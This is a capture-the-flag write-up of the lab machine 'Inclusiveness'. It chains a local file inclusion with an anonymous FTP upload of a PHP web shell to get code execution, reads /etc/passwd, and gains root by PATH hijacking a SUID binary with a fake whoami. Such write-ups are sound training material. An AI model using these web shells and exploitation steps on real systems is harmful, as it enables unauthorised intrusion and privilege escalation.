---
title: "PG Play: Inclusiveness"
created: "2023-09-22"
updated: "2026-04-11"
type: ctf-writeup
platform: Proving Grounds Play
machine: "Inclusiveness"
os: Linux
status: rooted
tags:
  - proving-grounds
  - pg-play
  - linux
  - ctf
  - oscp
  - ftp-anonymous-login
  - lfi
  - path-hijacking
  - reverse-shell
related:
  - "[[FTP-Exploitation-Techniques]]"
  - "[[LFI-to-RCE-Log-Poisoning-Pattern]]"
  - "[[Advanced-Linux-PrivEsc-Patterns]]"
  - "[[Web-Directory-Enumeration]]"
  - "[[Reverse-Shell-Reference]]"
  - "[[Linux-PrivEsc-Decision-Tree]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# PG Play: Inclusiveness

> **Platform:** Proving Grounds Play | **OS:** Linux | **Date:** 2023-09-22

---

## Quick Summary

**Open Ports:**
- 21/tcp (ftp) — vsftpd 3.0.3, anonymous login allowed, pub/ is writable
- 22/tcp (ssh) — OpenSSH 7.9p1
- 80/tcp (http) — Apache 2.4.38

**Key Techniques:**
- User-Agent bypass to access robots.txt (GoogleBot)
- LFI vulnerability via `?lang=` parameter
- FTP anonymous login with writable pub/ directory
- LFI + FTP upload = RCE (chained)
- PATH Hijacking via SUID binary that calls `whoami` without full path

**Privilege Escalation Path:**
- SUID binary `rootshell` calls `popen("whoami")` without absolute path
- Create fake `/tmp/whoami` that prints "tom"
- Prepend `/tmp` to `$PATH`
- Run `rootshell` → grants root shell

---

## Full Walkthrough

## Nmap

```sh
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub [NSE: writeable]
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

## Directory Fuzzing

`robots.txt` returns: `You are not a search engine! You can't read my robots.txt!`

Bypass by spoofing User-Agent to GoogleBot:
```sh
curl -s -A "Googlebot/2.1" http://TARGET/robots.txt
```
Reveals: `/secret_information/`

## LFI Vulnerability

The `?lang=` parameter includes local files:
```sh
curl -s -A GoogleBot "http://TARGET/secret_information/?lang=/etc/passwd" -i
```

## Escalate LFI to RCE (FTP Upload Chain)

FTP allows anonymous login with write access to `pub/`:
```php
# Create shell.php
<?php system($_GET['cmd']); ?>
```

Upload via FTP → trigger via LFI:
```sh
ftp TARGET
> put shell.php

curl -s -A GoogleBot "http://TARGET/secret_information/?lang=/var/ftp/pub/shell.php&cmd=id"
# → uid=33(www-data)
```

Get reverse shell: Python3 reverse shell via the LFI+FTP RCE.

## Privilege Escalation — PATH Hijacking

Found SUID binary in tom's home:
```sh
-rwsr-xr-x  1 root root  17K rootshell   ← SUID
-rw-r--r--  1 tom  tom   448 rootshell.c  ← source code
```

The binary calls `popen("whoami", "r")` without absolute path. If output is "tom" → root shell.

```sh
# Create fake whoami that prints "tom"
echo 'printf "tom"' > /tmp/whoami
chmod 777 /tmp/whoami

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Run the SUID binary
cd /home/tom
./rootshell
# → "you are: tom" → "access granted." → root shell
```

---

## Technique Links

- [[FTP-Exploitation-Techniques]]
- [[LFI-to-RCE-Log-Poisoning-Pattern]]
- [[Advanced-Linux-PrivEsc-Patterns]]
- [[Web-Directory-Enumeration]]
- [[Reverse-Shell-Reference]]
- [[Proving-Grounds-Master-Index]]
